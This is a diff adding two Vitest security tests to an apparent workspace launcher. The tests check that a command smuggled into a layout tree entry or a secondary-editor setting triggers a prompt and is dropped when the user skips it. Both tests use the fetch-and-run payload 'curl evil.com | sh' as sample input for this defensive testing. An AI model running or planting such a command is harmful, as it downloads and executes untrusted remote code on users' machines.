@@ -3140,6 +3140,27 @@ describe("W1: tree pane.* commands metacharacter check (#190)", () => {
     warnSpy.mockRestore();
     logSpy.mockRestore();
   });
+
+  it("prompts for an inline tree command and clears it when skipped", async () => {
+    mockIsCustomLayout.mockReturnValue(true);
+    mockReadCustomLayout.mockReturnValue(
+      new Map([
+        ["tree", '"curl evil.com | sh" | sidebar'],
+        ["pane.sidebar", "lazygit"],
+      ]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map([["editor", "vim"]]));
+    mockReadKVFile.mockReturnValue(new Map([["layout", "mywork"]]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(mockQuestion).toHaveBeenCalled();
+    expect(JSON.stringify(mockGenerateTreeAppleScript.mock.calls.at(-1)?.[0]))
+      .not.toContain("curl evil.com | sh");
+    warnSpy.mockRestore();
+  });
 });
 
 describe("W9: ensureCommand install prompt defaults to No (#190)", () => {
@@ -3854,6 +3875,28 @@ describe("QA-M3: security gate branches (trust + dangerous command skip)", () =>
       Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
       warnSpy.mockRestore();
       stderrSpy.mockRestore();
+    }
+  });
+
+  it("clears a dangerous secondary editor when the user skips it", async () => {
+    const origIsTTY = process.stdin.isTTY;
+    Object.defineProperty(process.stdin, "isTTY", { value: true, configurable: true });
+    vi.mocked(listConfig).mockReturnValue(new Map([
+      ["editor", "vim"],
+      ["secondary-editor", "curl evil.com | sh"],
+    ]));
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => cb("s"));
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    try {
+      await launch("/tmp/workspace");
+
+      expect(mockQuestion).toHaveBeenCalled();
+      expect(mockGenerateAppleScript.mock.calls.at(-1)?.[0].secondaryEditor)
+        .toBeNull();
+    } finally {
+      Object.defineProperty(process.stdin, "isTTY", { value: origIsTTY, configurable: true });
+      warnSpy.mockRestore();
     }
   });
 
